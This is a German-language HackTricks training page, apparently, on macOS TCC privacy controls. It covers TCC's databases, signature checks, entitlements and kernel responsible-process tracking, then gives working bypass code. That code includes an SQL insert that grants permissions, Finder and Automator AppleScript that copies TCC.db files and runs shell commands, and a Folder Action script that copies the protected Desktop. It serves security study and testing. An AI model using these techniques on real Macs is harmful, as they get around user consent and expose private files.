# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Grundlegende Informationen**

**TCC (Transparency, Consent, and Control)** ist ein Sicherheitsprotokoll, das die Berechtigungen von Anwendungen regelt. Seine Hauptaufgabe besteht darin, sensible Funktionen wie **Standortdienste, Kontakte, Fotos, Mikrofon, Kamera, Barrierefreiheit und vollständigen Festplattenzugriff** zu schützen. Indem TCC die ausdrückliche Zustimmung des Benutzers voraussetzt, bevor einer App Zugriff auf diese Funktionen gewährt wird, verbessert es den Datenschutz und die Kontrolle der Benutzer über ihre Daten.

Benutzer begegnen TCC, wenn Anwendungen Zugriff auf geschützte Funktionen anfordern. Dies wird durch eine Abfrage angezeigt, über die Benutzer **den Zugriff genehmigen oder verweigern** können. Darüber hinaus berücksichtigt TCC direkte Aktionen des Benutzers, etwa das **Ziehen und Ablegen von Dateien in eine Anwendung**, um Zugriff auf bestimmte Dateien zu gewähren. So wird sichergestellt, dass Anwendungen nur auf ausdrücklich freigegebene Inhalte zugreifen können.

![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** wird vom **Daemon** unter `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` verwaltet und in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` konfiguriert (dort wird der Mach-Dienst `com.apple.tccd.system` registriert).

Für jeden angemeldeten Benutzer läuft ein **tccd im Benutzermodus**, der in `/System/Library/LaunchAgents/com.apple.tccd.plist` definiert ist und die Mach-Dienste `com.apple.tccd` und `com.apple.usernotifications.delegate.com.apple.tccd` registriert.

Hier sehen Sie, wie tccd als System- und als Benutzerprozess läuft:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

Berechtigungen werden von der **übergeordneten** Anwendung **geerbt**, und die **Berechtigungen** werden anhand der **Bundle ID** und der **Developer ID** **nachverfolgt**.

### TCC-Datenbanken

Die Zulassungen und Ablehnungen werden dann in einigen TCC-Datenbanken gespeichert:

- Die systemweite Datenbank unter **`/Library/Application Support/com.apple.TCC/TCC.db`**.
  - Diese Datenbank ist durch **SIP geschützt**, daher kann nur ein SIP bypass in sie schreiben.
- Die TCC-Datenbank des Benutzers **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** für benutzerspezifische Einstellungen.
  - Diese Datenbank ist geschützt, sodass nur Prozesse mit hohen TCC-Berechtigungen wie Full Disk Access in sie schreiben können (sie ist jedoch nicht durch SIP geschützt).

> [!WARNING]
> Die vorherigen Datenbanken sind auch **beim Lesezugriff durch TCC geschützt**. Daher kannst du deine normale TCC-Datenbank des Benutzers **nicht lesen**, es sei denn, der Zugriff erfolgt durch einen TCC-privilegierten Prozess.
>
> Beachte jedoch, dass ein Prozess mit diesen hohen Berechtigungen (wie **FDA** oder **`kTCCServiceEndpointSecurityClient`**) in die TCC-Datenbank des Benutzers schreiben kann.

- Es gibt eine **dritte** TCC-Datenbank unter **`/var/db/locationd/clients.plist`**, in der Clients aufgeführt sind, die auf **Ortungsdienste zugreifen** dürfen.
- **`/Library/Application Support/com.apple.TCC/REG.db`** speichert registrierte TCC-Datenbankpfade. Eine platzierte Benutzerdatenbank wird möglicherweise abgelehnt, wenn sie nicht registriert ist; allein die Kenntnis dieses Pfads gewährt keinen Zugriff auf eine der beiden Datenbanken.<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`** enthält verwaltete Entscheidungen der Privacy Preferences Policy Control (PPPC). Prüfe diese Datei, wenn eine App eine verwaltete Genehmigung hat, die in den gewöhnlichen `access`-Einträgen fehlt.<sup>[[7]](#references)</sup>
- Die durch SIP geschützte Datei **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (die jedoch von allen gelesen werden kann) enthält eine Allowlist von Anwendungen, die eine TCC-Ausnahme benötigen.

> [!TIP]
> Die TCC-Datenbank in **iOS** befindet sich unter **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> Die **Benachrichtigungszentrale-UI** kann **Änderungen an der systemweiten TCC-Datenbank vornehmen**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Benutzer können Regeln jedoch mit dem Kommandozeilenprogramm **`tccutil`** **zurücksetzen**; eine dokumentierte Abfragefunktion gibt es nicht.<sup>[[4]](#references)</sup>

#### Datenbanken abfragen

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> Wenn du beide Datenbanken überprüfst, kannst du sehen, welche Berechtigungen eine App erlaubt, verweigert oder noch nicht hat (sie wird danach fragen).

- **`service`** ist die TCC-String-Darstellung der **Berechtigung**
- **`client`** ist die **Bundle-ID** oder der **Pfad zur Binärdatei** mit den Berechtigungen
- **`client_type`** gibt an, ob es sich um einen Bundle Identifier (0) oder einen absoluten Pfad (1) handelt

<details>

<summary>So führst du es aus, wenn es sich um einen absoluten Pfad handelt</summary>

Führe einfach **`launctl load you_bin.plist`** aus, mit einer plist wie:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`** kann verschiedene Werte haben: denied(0), unknown(1), allowed(2) oder limited(3).
- **`auth_reason`** kann folgende Werte annehmen: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Das Feld **csreq** gibt an, wie die auszuführende Binärdatei überprüft und mit TCC-Berechtigungen versehen werden soll:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- Weitere Informationen zu den **anderen Feldern** der Tabelle finden Sie in [**diesem Blogbeitrag**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Sie können auch **bereits erteilte Berechtigungen** für Apps unter `Systemeinstellungen --> Sicherheit & Datenschutz --> Datenschutz --> Dateien und Ordner` prüfen.

> [!TIP]
> Benutzer können Regeln mit **`tccutil` zurücksetzen**, müssen aber die Datenbanken untersuchen, um erteilte Berechtigungen abzufragen.<sup>[[4]](#references)</sup>

#### TCC-Berechtigungen zurücksetzen

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Apple-Events-Berechtigungen für Sender und Ziel ermitteln

Eine Automation-Berechtigung ist eine Entscheidung **vom Sender zum Ziel** und keine Berechtigung, jede App zu steuern. Wenn du Zugriff auf die Benutzerdatenbank hast, ermittle alle erlaubten Sender-Ziel-Paare, bevor du die unten beschriebenen [Apple Events](macos-apple-events.md)- oder Finder-Workflows ausprobierst. `csreq` identifiziert den Sender und `indirect_object_code_identity` das Ziel; dekodiere jeden nicht nullwertigen Blob mit der obigen `csreq`-Methode.<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### TCC-Signaturprüfungen

Die TCC-**Datenbank** speichert die **Bundle ID** der Anwendung, aber auch **Informationen** zur **Signatur**, um **sicherzustellen**, dass die App, die eine Berechtigung verwenden möchte, die richtige ist.

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> Daher können andere Anwendungen mit demselben Namen und derselben Bundle-ID nicht auf Berechtigungen zugreifen, die anderen Apps erteilt wurden.

### Entitlements & TCC-Berechtigungen

Eine TCC-Freigabe setzt **App Sandbox**-Einschränkungen nicht außer Kraft. Ein sandboxed Kamera-Client benötigt `com.apple.security.device.camera`; Apple stellt diese Fähigkeit auch für Apps mit Hardened Runtime bereit. Keines der beiden Entitlements umgeht die separate Zustimmungsabfrage des Benutzers. Betrachte das Sandbox-Entitlement nicht als uneingeschränkte Voraussetzung für jeden nicht sandboxed Prozess. Prüfe sowohl die Entitlements der ausführbaren Datei als auch die verantwortliche App, wenn eine Anfrage fehlschlägt.<sup>[[8]](#references)[[9]](#references)</sup>

Beachte, dass Entitlements plist-Dateien sind und Teil der code sig sind. Sie werden in der code sig zusätzlich durch spezielle Slots gehasht und können entweder im Kernel durch Kernel-Code oder durch User-Model-Code mithilfe von `csops(#169)` oder `csops_audittoken(#170)` abgefragt werden.

Damit Apps jedoch auf **bestimmte Benutzerordner** wie `~/Desktop`, `~/Downloads` und `~/Documents` **zugreifen** können, benötigen sie **keine** bestimmten **Entitlements**. Das System verwaltet den Zugriff transparent und **fragt den Benutzer** bei Bedarf um Erlaubnis.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple-Apps **lösen keine Abfragen aus**. Ihre **Entitlements**-Liste enthält **vorab gewährte Rechte**. Das bedeutet, dass sie **niemals ein Pop-up auslösen** und **auch** in keiner der **TCC-Datenbanken** auftauchen. Zum Beispiel:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

Dadurch wird verhindert, dass Kalender den Benutzer um Zugriff auf Erinnerungen, Kalender und das Adressbuch bittet.

> [!TIP]
> Neben einigen offiziellen Dokumentationen zu Entitlements gibt es auch inoffizielle **interessante Informationen zu Entitlements unter** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Einige TCC-Berechtigungen sind: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Es gibt keine öffentliche Liste, die sie alle aufführt, aber du kannst diese [**Liste bekannter Berechtigungen**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) einsehen.<sup>[[1]](#references)</sup>

### Sensible, ungeschützte Speicherorte

- $HOME (selbst)
- $HOME/.ssh, $HOME/.aws usw.
- /tmp

### Benutzerabsicht / com.apple.macl

Wie bereits erwähnt, ist es möglich, **einer App Zugriff auf eine Datei zu gewähren, indem man sie per Drag & Drop auf die App zieht**. Dieser Zugriff wird in keiner TCC-Datenbank angegeben, sondern als **erweitertes** **Dateiattribut** gespeichert. Dieses Attribut **speichert die UUID** der zugelassenen App:<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> Es ist interessant, dass das Attribut **`com.apple.macl`** von der **Sandbox** und nicht von tccd verwaltet wird.
>
> Beachte außerdem: Wenn du eine Datei, die der UUID einer App auf deinem Computer Zugriff gewährt, auf einen anderen Computer verschiebst, erhält diese App keinen Zugriff, da dieselbe App dort eine andere UID hat.

Das erweiterte Attribut `com.apple.macl` **kann nicht wie andere erweiterte Attribute gelöscht werden**, da es **durch SIP geschützt ist**. Wie jedoch [**in diesem Beitrag erklärt**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), lässt sich dieser Schutz umgehen, indem du die Datei **komprimierst**, **löschst** und anschließend **entpackst**.<sup>[[3]](#references)</sup>






## XNU-Mechanismus für den verantwortlichen Prozess

In macOS/iOS ist der Mechanismus des **verantwortlichen Prozesses** eine wichtige Sicherheitsfunktion, die vom **TCC-Framework (Transparency, Consent, and Control)** und anderen Sicherheitssystemen verwendet wird, um nachzuverfolgen, welcher Prozess letztlich für eine Aktion verantwortlich ist – auch über Prozessketten mit untergeordneten Prozessen hinweg.

Wenn TCC Berechtigungen prüft (z. B. für Kamera, Mikrofon oder Standort), prüft es nicht immer den Prozess, der die Anfrage unmittelbar stellt. Stattdessen prüft es den **verantwortlichen Prozess** – in der Regel die GUI-Anwendung, von der die Aktion ausging, selbst wenn die eigentliche Anfrage von einem Hilfsprozess oder Daemon gestellt wird.

Um zu ermitteln, welche App einer Anfrage tatsächlich zugeordnet wird, zeichne die `AttributionChain`-Meldungen von TCC auf, während du den geschützten Vorgang ausführst. Das ist zuverlässiger, als dem Hilfsprogramm allein deshalb eine Berechtigung zuzuweisen, weil es den API-Aufruf ausgeführt hat. Vergleiche die gemeldete Identität mit der Bundle-ID oder dem Pfad und der Signaturanforderung in der relevanten `access`-Zeile.<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>Wie der verantwortliche Prozess festgelegt wird</summary>

### Prozessstrukturfelder

Jeder Prozess in XNU verwaltet zwei wichtige UUID-Kennungen:

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: Die UUID des Prozesses selbst (aus dem `LC_UUID`-Ladebefehl seiner Mach-O-Binärdatei)
- **`p_responsible_pid`**: Die PID des verantwortlichen Prozesses
- **`p_responsible_uuid`**: Die UUID des verantwortlichen Prozesses (bleibt auch nach Beendigung dieses Prozesses erhalten)

### So wird der verantwortliche Prozess festgelegt

1. **Bei der Prozesserstellung (Fork)**

Wenn ein neuer Prozess über `fork()` oder `posix_spawn()` erstellt wird, wird der verantwortliche Prozess vom übergeordneten Prozess übernommen (der `exec()`-Systemaufruf verwendet die vorhandene `proc`-Struktur wieder, daher wird dieser Schritt dort nicht wiederholt):

**Position**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**Wichtige Punkte:**
- Kindprozesse **erben** die `p_responsible_pid` des Elternprozesses
- Dadurch entsteht eine **Kette der Verantwortlichkeit** innerhalb der Prozesshierarchie
- Der verantwortliche Prozess verweist typischerweise auf die ursprüngliche GUI-Anwendung

2. **Die Kernfunktion: `proc_set_responsible_pid()`**

**Fundstelle**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**Was diese Funktion macht:**
1. **Legt die verantwortliche PID fest** im Zielprozess
2. **Sucht den verantwortlichen Prozess** mit `proc_find()` (erhöht den Referenzzähler)
3. **Kopiert die UUID** aus `p_uuid` des verantwortlichen Prozesses nach `p_responsible_uuid` des Zielprozesses
4. **Gibt die Referenz frei** mit `proc_rele()` (verringert den Referenzzähler)

3. **Warum PID und UUID speichern?**

Der Ansatz mit doppelter Speicherung löst ein kritisches Problem:

| Feld | Zweck | Problem | Lösung |
|-------|-------|---------|----------|
| `p_responsible_pid` | Schnelles Auffinden des aktuellen Prozesses | Die PID kann nach dem Beenden des Prozesses wiederverwendet werden | Wird zum Auffinden aktiver Prozesse verwendet |
| `p_responsible_uuid` | Dauerhafte Identifizierung | Bleibt nach dem Beenden des Prozesses erhalten | Wird für Sicherheitsprüfungen und Audits verwendet |

**Das Problem**: Wenn der verantwortliche Prozess vor dem Kindprozess beendet wird, kann die PID recycelt und einem völlig anderen Prozess zugewiesen werden.

**Die Lösung**: Die UUID ist unveränderlich und identifiziert eindeutig die spezifische Binärdatei, die verantwortlich war, selbst nachdem sie beendet wurde.

### Prozess-Erstellungsablauf

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### UUID-Quelle: LC_UUID-Load-Command

Die in `p_uuid` gespeicherte UUID stammt aus dem **LC_UUID-Load-Command der Mach-O-Executable**:

1. **Kompilierungszeit**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **Ausführungszeit**

**Location**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **In der Prozessstruktur gespeichert**

**Location**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**Fundstelle**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### In TCC einfügen

Wenn du irgendwann Schreibzugriff auf eine TCC-Datenbank erhältst, kannst du etwa Folgendes verwenden, um einen Eintrag hinzuzufügen (entferne die Kommentare):

<details>

<summary>Beispiel: In TCC einfügen</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### TCC-Payloads

Wenn du es geschafft hast, in eine App mit bestimmten TCC-Berechtigungen einzudringen, findest du auf der folgenden Seite TCC-Payloads, die du ausnutzen kannst:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Mehr über Apple Events erfährst du hier:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) zu FDA\*

Der TCC-Name der Automation-Berechtigung lautet: **`kTCCServiceAppleEvents`**\
Diese spezifische TCC-Berechtigung gibt auch an, **welche Anwendung** in der TCC-Datenbank verwaltet werden kann (die Berechtigung erlaubt also nicht, einfach alles zu verwalten).

**Finder** ist eine Anwendung, die **immer über FDA verfügt** (auch wenn dies nicht in der Benutzeroberfläche angezeigt wird). Wenn du also **Automation**-Berechtigungen für Finder hast, kannst du diese Berechtigungen missbrauchen, um **Finder bestimmte Aktionen ausführen zu lassen**.\
In diesem Fall müsste deine App die Berechtigung **`kTCCServiceAppleEvents`** für **`com.apple.Finder`** haben.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

Bei einer beschriebenen Schreibvariante wird, sofern ein Automation-Pfad zu Finder verfügbar ist, Finder dazu gebracht, das Benutzerverzeichnis `com.apple.TCC` **umzubenennen**. Anschließend wurde die Datenbank im umbenannten Pfad in ein Staging-Verzeichnis kopiert, dort geändert, zurückkopiert und das Verzeichnis wieder umbenannt. Die neue Zeile `kTCCServiceAppleEvents` muss **sowohl die sendende Binärdatei als auch Finder** einschließlich ihrer Code Requirements identifizieren; einem Sender ohne die Zielidentität eine Berechtigung zu erteilen, ist nicht gleichwertig. Da diese Technik pfadabhängig ist, solltest du sie auf der jeweiligen macOS-Version überprüfen, statt davon auszugehen, dass Finder Automation allein beliebige Schreibzugriffe auf die Datenbank ermöglicht.<sup>[[11]](#references)</sup>

> [!WARNING]
> Mit dieser Berechtigung kannst du **Finder auffordern, auf TCC-geschützte Ordner zuzugreifen** und dir die Dateien zu geben. Soweit ich weiß, **kannst du Finder jedoch nicht dazu bringen, beliebigen Code auszuführen**, um seinen FDA-Zugriff vollständig auszunutzen.
>
> Daher kannst du nicht die gesamten FDA-Funktionen ausnutzen.

Dies ist die TCC-Abfrage, um Automation-Berechtigungen für Finder zu erhalten:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Beachte, dass die **Automator**-App die TCC-Berechtigung **`kTCCServiceAppleEvents`** besitzt und damit **jede App**, etwa Finder, steuern kann. Wenn du also die Berechtigung hast, Automator zu steuern, kannst du mit Code wie dem folgenden auch **Finder** steuern:

<details>

<summary>Eine Shell in Automator öffnen</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

Dasselbe passiert mit der **Script Editor-App**: Sie kann Finder steuern, aber mit einem AppleScript kannst du sie nicht dazu zwingen, ein Skript auszuführen.

### Automatisierung (SE) für einige TCC-Bereiche

**System Events kann Folder Actions erstellen, und Folder Actions können auf einige TCC-Ordner zugreifen** (Desktop, Dokumente und Downloads). Daher kann ein Skript wie das folgende verwendet werden, um dieses Verhalten auszunutzen:

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Automation (SE) + Barrierefreiheit (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** für FDA\*

